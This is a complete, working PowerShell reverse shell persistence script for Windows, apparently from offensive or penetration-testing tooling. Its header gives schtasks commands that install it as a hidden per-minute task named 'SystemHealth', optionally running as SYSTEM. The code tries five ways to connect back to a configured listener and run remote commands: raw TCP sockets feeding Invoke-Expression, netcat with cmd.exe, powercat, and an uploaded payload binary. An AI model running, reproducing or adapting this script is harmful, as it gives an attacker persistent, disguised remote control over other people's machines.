# ==============================================================================
# REVERSE SHELL PERSISTENCE SCRIPT (Windows / PowerShell)
# ==============================================================================
# Designed to run as a scheduled task every minute. Tries multiple methods
# until one succeeds. If a connection already exists, exits cleanly.
#
# SETUP - create scheduled task (run from cmd.exe or PowerShell as current user):
#
#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\windows\temp\revshell.ps1" /sc minute /mo 1 /f
#
# To run as SYSTEM (requires elevated shell):
#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\windows\temp\revshell.ps1" /sc minute /mo 1 /ru SYSTEM /f
#
# To delete the task during cleanup:
#   schtasks /delete /tn "SystemHealth" /f
# ==============================================================================

# ==============================================================================
# CONFIGURATION - edit before deploying
# ==============================================================================
$LHOST = "10.10.10.10"
$LPORT = 4444

# ==============================================================================
# CHECK FOR EXISTING CONNECTION
# Avoids spawning duplicate shells to the same listener
# ==============================================================================
try {
    $existing = Get-NetTCPConnection -RemoteAddress $LHOST -RemotePort $LPORT -ErrorAction SilentlyContinue
    if ($existing) { exit 0 }
} catch {}

# ==============================================================================
# CONNECTION METHODS
# Ordered from most reliable to least. Each function exits the script on success.
# ==============================================================================

# Method 1: PowerShell TCP socket (pure PS, no dependencies)
function Try-PSSocket {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
        $sendback = ($([System.Text.Encoding]::ASCII.GetString($bytes, 0, $stream.Read($bytes, 0, $bytes.Length))))
        $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
        while ($true) {
            [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
            $bytesRead = $stream.Read($bytes, 0, $bytes.Length)
            if ($bytesRead -eq 0) { break }
            $data = ([text.encoding]::ASCII).GetString($bytes, 0, $bytesRead)
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        exit 0
    } catch {
        return $false
    }
}

# Method 2: PowerShell one-liner style (alternative socket approach using StreamReader/Writer)
# More stable on some targets where the byte-array method above has issues
function Try-PSSocket2 {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        while ($true) {
            $cmd = $reader.ReadLine()
            if ($null -eq $cmd -or $cmd -eq "exit") { break }
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $output = $_.Exception.Message
            }
            $writer.WriteLine($output)
        }
        $client.Close()
        exit 0
    } catch {
        return $false
    }
}

# Method 3: Netcat (if nc.exe has been uploaded or exists on target)
function Try-Netcat {
    $ncPaths = @(
        "C:\windows\temp\nc.exe",
        "C:\temp\nc.exe",
        "C:\nc.exe",
        "C:\ProgramData\nc.exe"
    )
    foreach ($ncPath in $ncPaths) {
        if (Test-Path $ncPath) {
            try {
                & $ncPath -e cmd.exe $LHOST $LPORT 2>$null
                exit 0
            } catch {
                continue
            }
        }
    }
    return $false
}

# Method 4: PowerCat (if powercat.ps1 has been uploaded or imported on target)
function Try-PowerCat {
    try {
        if (Get-Command powercat -ErrorAction SilentlyContinue) {
            powercat -c $LHOST -p $LPORT -e cmd.exe
            exit 0
        }
        # Also check common upload paths
        $pcPaths = @(
            "C:\windows\temp\powercat.ps1",
            "C:\temp\powercat.ps1"
        )
        foreach ($pcPath in $pcPaths) {
            if (Test-Path $pcPath) {
                . $pcPath
                powercat -c $LHOST -p $LPORT -e cmd.exe
                exit 0
            }
        }
    } catch {
        return $false
    }
}

# Method 5: Custom shell binary (msfvenom payload or similar)
function Try-ShellBinary {
    $shellPaths = @(
        "C:\windows\temp\shell.exe",
        "C:\temp\shell.exe",
        "C:\ProgramData\shell.exe"
    )
    foreach ($shellPath in $shellPaths) {
        if (Test-Path $shellPath) {
            try {
                & $shellPath
                exit 0
            } catch {
                continue
            }
        }
    }
    return $false
}

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================
Try-PSSocket
Try-PSSocket2
Try-Netcat
Try-PowerCat
Try-ShellBinary

# All methods failed - exit cleanly
exit 0
